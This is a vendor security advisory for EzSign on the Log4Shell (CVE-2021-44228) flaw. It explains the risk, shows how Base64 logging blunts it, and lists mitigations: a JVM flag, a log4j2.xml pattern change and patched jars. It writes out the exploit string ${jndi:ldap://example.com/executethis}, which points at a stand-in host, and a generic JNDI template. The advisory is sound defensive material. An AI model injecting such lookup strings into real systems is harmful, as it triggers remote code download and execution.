---
layout: default
title: EzSign CVE-2021-44228
parent: EzSign
nav_order: 100
---

# EzSign: CVE-2021-44228

> Apache Log4j2 Vulnerability (Log4Shell)



A vulnerability exists in log4j2 that leverages JNDI to potentially allow an attacker to provide a string that is interpreted as a variable  

JNDI does not enforce any security controls on LDAP requests, therefore if a string such as the following:

```
${jndi:ldap://[host]/[path]}
```

Could be logged, Log4J would interpret it as a variable and this would result in the classes available at the ``[host]/[path]`` location being downloaded and executed

<br>

## Am I Vulnerable

EzSign does makes use of the vulnerable  log4j2 libraries. However, input is passed to the server via the EzSign client and the client is itself driven by internal applications. Applications that utilise the EzSign client are not usually web facing  

Data sent to EzSign is generally tightly controlled (from trusted sources etc.), but data from an external source could enter the EzSign logs if sent as part of data to sign (or verify). However, this will not make it to the log system in the intended format  

If you hash this data before sending to EzSign then no original data will be sent to the EzSign logging system anyway and a variable will  therefore not be logged

But EzSign also converts data it receives to Base64 before logging. So if an attack string does enter the system, it will still not be logged as intended   

For example, if an attacker were to attempt to send the following string, as part of a message to sign data:

```
${jndi:ldap://example.com/executethis}
```

It would be logged as follows:

```
JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9leGVjdXRldGhpc30=
```

and if hashed prior, as:

```
mthnTlPO6hThbYbhQHyZ1uDVqN+CKyNcsdakX/GmckM=
```

I.e. the attack string is not sent to Log4J as the intended string - but the Base64 encoded form (of the original or hashed version). This means log4j is not sent the variable

<br>

Channel names, may be logged as sent to EzSign however. But these names are defined and configured by the trusted applications that call the EzSign client. They should not be passed in from external sources nor dependant on any end-user data

<br>

Essentially, EzSign can only log what the calling application sends, and even then data is converted to Base 64. If the calling applications are secure then the risk is low. However, to ensure protection it is recommended to also apply the updates described in the next section:

<br>

### What should we do

If you are running EzSign against versions of Java greater than the following:

- Java 7 – 7u202
- Java 8 – 8u192
- Java 11 - 11.0.2

Then you may be protected

<br>

In any case, the following should be performed as additional protections:

<u>Update the start script</u>

Update the ``ezsign-daemon-start.sh`` script (``ezsign-daemon-start.bat`` on windows) to include 

```
-Dlog4j2.formatMsgNoLookups=true
```

To perform this, locate your ``ezsign-daemon-start.sh`` script. By default, this will be located here:

``[installation]/EzSignServer/bin``

Edit the file by locating the following line:

```shell
"%JAVA_HOME%\bin\java" -Dlog4j.configurationFile=%LOGCONFIG% -classpath %CLASSPATH% com.krestfield.ezsign.server.EzSignServer %1 %2
```

And adding the ``-Dlog4j2.formatMsgNoLookups=true`` section

E.g.

```shell
"%JAVA_HOME%\bin\java" -Dlog4j2.formatMsgNoLookups=true -Dlog4j.configurationFile=%LOGCONFIG% -classpath %CLASSPATH% com.krestfield.ezsign.server.EzSignServer %1 %2
```

On Linux/Unix the updated line may look as Follows:

```shell
$JAVA_HOME/bin/java -Dlog4j2.formatMsgNoLookups=true -Dlog4j.configurationFile=$LOGCONFIG -cp $CLASSPATH com.krestfield.ezsign.server.EzSignServer $1 $2 $3
```

<br>

<u>Update the log4j2.xml file</u>

This resides, by default here:

```shell
[EzSign Install]\EzSignServer\logconf\log4j2.xml
```

It will begin as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
	
	<Properties>
		<property name="name">ezsign</property>
		<property name="pattern">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n</property>

	</Properties>
	...
```

All that is needed is to replace the ``%msg%n`` section with ``%msg{nolookups}%n``. When done the file will then look like this:  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
	
	<Properties>
		<property name="name">ezsign</property>
		<property name="pattern">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n</property>

	</Properties>
	...
```

Save the file  

<br>

On Windows environments, also add in the following *System Environment Variable*:

```
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

<br>

Restart the EzSign services

<br>

If EzSign is not performing any revocation checking (CRL or OCSP) then it does not need any external access. Restrict access from EzSign to any external sites using firewall rules

<br>

### Patches

There are two patched files that may be applied to your EzSign installation. First, identify which you need by navigating to:

```
[EzSign Install]\EzSignServer\lib
```

and locating the file that starts ``log4j-core-``. It will be either:

* log4j-core-2.11.1.jar
* log4j-core-2.7.jar (on older versions of EzSign)

Patched versions of these files can be obtained from the following links

* [log4j-core-2.11.1-patch.jar](https://krestfield.s3.eu-west-2.amazonaws.com/certdog/log4j-core-2.11.1-patch.jar)
  * SHA1 Hash: ``673fb9946bf2812b1f5ae29b0da1580da463753e``
* [log4j-core-2.7-patch.jar](https://krestfield.s3.eu-west-2.amazonaws.com/certdog/log4j-core-2.7-patch.jar)
  * SHA1 Hash: ``0b70dfab800a3eb184f690b43e0536951a9234d2``

Download the  version that matches your current installation

Backup the existing file and replace with the patched version. Note, on EzSign versions 3.0.0 and earlier, you may need to keep the original filename (e.g. rename the patched file from ``log4j-core-2.7-patch.jar`` to ``log4j-core-2.7.jar``)

<br>

### What version of Log4j2 does EzSign use?

Version 3.0.0 and earlier uses  Log4J version 2.7

Version 4.0.0 and later uses Log4J version 2.11.1

<br>

### More Information

Contact [Krestfield Support](mailto:support@krestfield.com) for more information

